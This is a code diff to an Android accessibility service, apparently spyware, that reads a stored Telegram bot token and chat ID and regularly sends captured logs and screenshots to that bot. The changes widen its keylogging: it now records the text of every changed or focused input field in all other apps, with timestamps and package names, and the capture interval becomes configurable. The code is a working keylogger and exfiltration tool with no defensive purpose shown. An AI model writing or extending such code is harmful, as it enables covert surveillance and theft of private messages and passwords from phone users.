@@ -43,6 +43,8 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
     private var botToken: String = ""
     private var targetChatId: String = ""
     private var sendCamera: Boolean = false
+    private var screenshotInterval: Long = 10000L // Default 10 seconds
+
     
     private val lifecycleRegistry = LifecycleRegistry(this)
     private var imageCapture: ImageCapture? = null
@@ -97,15 +99,14 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         }
     }
 
-
-
-
-
     private fun loadCredentials() {
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         botToken = pref.getString("token", "") ?: ""
         targetChatId = pref.getString("chatId", "") ?: ""
         sendCamera = pref.getBoolean("sendCamera", false)
+        val sec = pref.getLong("screenshotInterval", 10L) 
+        screenshotInterval = sec * 1000L
+        if (screenshotInterval < 5000L) screenshotInterval = 5000L // Minimum 5s enforcement
     }
 
     private var lastLogSendTime = System.currentTimeMillis()
@@ -128,7 +129,7 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                         sendAndClearLogs()
                     }
                 }
-                delay(10_000) // 10 seconds delay
+                delay(screenshotInterval) 
             }
         }
     }
@@ -328,9 +329,6 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
             Log.e("TelegramService", "Network error", e)
         }
     }
-
-
-
     private fun startForegroundServiceNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channelId = "TelegramSenderChannel"
@@ -352,29 +350,31 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
+        
+        // Exclude own app and system UI
+        val pkgName = event.packageName?.toString() ?: ""
+        if (pkgName == "com.example.telegramsender") return 
+        // if (pkgName == "com.android.systemui") return // Optional: keeping it might miss notifications
 
-        // Filter out system UI noise
-        if (event.packageName?.toString() == "com.android.systemui") return
-
-        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
+            event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+            
             val currentText = event.text?.filterNot { it.isNullOrBlank() }?.joinToString(" ") ?: ""
-            val key = "${event.packageName}_${event.source?.viewIdResourceName ?: "unknown"}"
-            val previousText = lastTextMap[key] ?: ""
             
-            // "Log on Clear" Logic:
-            // If the text field becomes empty (or very short) after having substantial text, 
-            // we assume the message was SENT or cleared.
-            // valid message > 2 chars, cleared means < 1 char
-            
-            if (currentText.isEmpty() && previousText.trim().length > 1) {
-                // Log the COMPLETED message
-                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
-                val logEntry = "[$timestamp] [${event.packageName}]: $previousText\n"
-                appendLogToFile(logEntry)
+            // Simple robust logging: Log everything > 1 char
+            // To reduce extreme duplication, strict check against last log could be done, 
+            // but for "always record", let's be verbose first.
+            if (currentText.length > 1) {
+                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
+                 val key = "${pkgName}_${event.source?.viewIdResourceName ?: "unknown"}"
+                 val previousText = lastTextMap[key] ?: ""
+                 
+                 // Avoid logging exact duplicates in sequence
+                 if (currentText != previousText) {
+                     appendLogToFile("[$timestamp] [$pkgName]: $currentText\n")
+                     lastTextMap[key] = currentText
+                 }
             }
-            
-            // Always update the map with current state
-            lastTextMap[key] = currentText
         }
     }
     
